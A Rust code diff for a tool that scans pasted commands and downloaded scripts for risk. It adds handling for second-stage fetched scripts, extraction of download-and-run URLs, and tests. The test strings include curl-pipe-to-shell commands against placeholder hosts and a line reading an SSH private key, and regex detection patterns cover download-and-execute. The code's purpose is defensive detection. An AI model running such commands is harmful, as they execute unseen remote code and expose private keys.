@@ -13,6 +13,8 @@ pub enum Context {
     Code(Lang),
     /// A command the user is about to paste into a terminal.
     Pasted,
+    /// A script that a pasted command downloads and runs, fetched and read in its place.
+    Fetched,
 }
 
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
@@ -38,6 +40,7 @@ static DOWNLOAD_EXEC: LazyLock<Regex> = LazyLock::new(|| {
         r"|\b(iwr|irm|invoke-webrequest|invoke-restmethod)\b[^;\n]*\|\s*iex\b",
     ))
 });
+static FULL_URL: LazyLock<Regex> = LazyLock::new(|| re(r#"(?i)https?://[^\s'"|)\\<>`]+"#));
 static URL: LazyLock<Regex> = LazyLock::new(|| re(r#"(?i)https?://([^\s'"|)/\\]+)"#));
 static AI_BYPASS: LazyLock<Regex> = LazyLock::new(|| {
     re(
@@ -146,6 +149,39 @@ pub(crate) fn download_host(line: &str) -> Option<String> {
     URL.captures(line).map(|c| c[1].to_string())
 }
 
+static FETCH_TOOL: LazyLock<Regex> = LazyLock::new(|| {
+    re(
+        r"(?i)(^|[^\w./-])(curl|wget|git|aria2c|invoke-webrequest|iwr|urllib|requests\.get|fetch\s*\()",
+    )
+});
+
+/// First line of a downloaded script that names a download tool, and the tool.
+pub(crate) fn fetch_tool(text: &str) -> Option<(usize, &str, &str)> {
+    text.lines().enumerate().find_map(|(i, l)| {
+        if is_comment(l) {
+            return None;
+        }
+        FETCH_TOOL
+            .captures(l)
+            .and_then(|c| c.get(2))
+            .map(|m| (i + 1, m.as_str().trim_end_matches(['(', ' ']), l))
+    })
+}
+
+/// Every URL on a line that downloads and runs, in order, without duplicates.
+pub(crate) fn download_urls(text: &str) -> Vec<String> {
+    let mut out: Vec<String> = Vec::new();
+    for line in text.lines().filter(|l| !is_comment(l) && download_exec(l)) {
+        for m in FULL_URL.find_iter(line) {
+            let url = m.as_str().trim_end_matches(['.', ',', ';']).to_string();
+            if !out.contains(&url) {
+                out.push(url);
+            }
+        }
+    }
+    out
+}
+
 pub(crate) fn has_download_exec(text: &str) -> bool {
     text.lines().any(|l| !is_comment(l) && download_exec(l))
 }
@@ -165,7 +201,7 @@ fn is_comment(line: &str) -> bool {
 }
 
 fn escalate(ctx: Context, code: Severity, elsewhere: Severity) -> Severity {
-    if matches!(ctx, Context::Code(_)) {
+    if matches!(ctx, Context::Code(_) | Context::Fetched) {
         code
     } else {
         elsewhere
@@ -244,6 +280,12 @@ pub fn scan_text(
                     Severity::Info,
                     format!(
                         "A container build downloads a script{from} and runs it. That happens inside the container, not on your machine."
+                    ),
+                ),
+                Context::Fetched => (
+                    Severity::Opaque,
+                    format!(
+                        "This script downloads another script{from} and runs it. That one was not fetched, so what it does is unseen."
                     ),
                 ),
                 Context::Pasted => (
@@ -589,6 +631,43 @@ mod tests {
             rules(js, Context::Code(Lang::Program)),
             vec![("persistence", Severity::Warning)]
         );
+    }
+
+    #[test]
+    fn urls_of_download_and_run_lines_only() {
+        let cmd = "curl -o a.tgz https://x.invalid/a.tgz\ncurl -fsSL 'https://x.invalid/i.sh' | sh\nbash -c \"$(curl -fsSL https://y.invalid/p)\"";
+        assert_eq!(
+            download_urls(cmd),
+            vec![
+                "https://x.invalid/i.sh".to_string(),
+                "https://y.invalid/p".to_string()
+            ]
+        );
+    }
+
+    #[test]
+    fn a_fetched_script_that_downloads_again_is_unseen_not_suspicious() {
+        let line = "curl -fsSL https://x.invalid/stage2 | sh";
+        assert_eq!(
+            rules(line, Context::Fetched),
+            vec![("download-and-run", Severity::Opaque)]
+        );
+        let line = "cat ~/.ssh/id_ed25519";
+        assert_eq!(
+            rules(line, Context::Fetched),
+            vec![("secret-store", Severity::Warning)]
+        );
+    }
+
+    #[test]
+    fn download_tools_in_a_fetched_script() {
+        let rustup = "    if check_cmd curl; then\n        _dld=curl\n";
+        assert_eq!(
+            fetch_tool(rustup).map(|(n, t, _)| (n, t)),
+            Some((1, "curl"))
+        );
+        assert!(fetch_tool("# uses curl\nmkdir -p ~/.local/bin\necho done\n").is_none());
+        assert!(fetch_tool("cp ./bin/curly /usr/local/bin\n").is_none());
     }
 
     #[test]
